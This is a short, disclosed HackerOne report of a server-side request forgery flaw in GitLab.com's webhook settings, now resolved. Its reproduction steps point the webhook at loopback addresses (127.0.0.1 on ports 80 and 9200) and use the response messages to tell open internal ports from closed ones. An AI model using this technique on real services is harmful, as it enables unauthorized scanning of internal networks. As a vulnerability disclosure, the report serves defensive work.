# [M] SSRF vulnerability in gitlab.com webhook

## Summary
Severity: Medium
Program: GitLab
Weakness: Server-Side Request Forgery (SSRF)
Reporter: wuqidashi
State: resolved
Disclosed: 2018-04-30T18:14:57.444Z
Source: https://hackerone.com/reports/301924

## Details
1、
Login to your GitLab account and create a new project, then go to-->>https://gitlab.com/{username}/{project}}/settings/integrations

2、
You can add url to ssrf.following are the steps to reproduce:

If you enter http://127.0.0.1:80/haha.txt as url,we will get -->>Hook executed successfully but returned HTTP 404 <html> <head><title>404 Not Found</title></head> <body bgcolor="white"> <center><h1>404 Not Found</h1></center> <hr><center>nginx/1.12.1</center> </body> </html>



If you enter http://127.0.0.1:9200/haha.txt as url, we will get -->>Hook execution failed: Failed to open TCP connection to 127.0.0.1:9200 (Connection refused - connect(2) for "127.0.0.1" port 9200)
(indicating that the port is actually closed.)

The test was done on https://gitlab.com/

I did not do more test.Thanks

## Impact

can scan the intranet to get sensitive information.
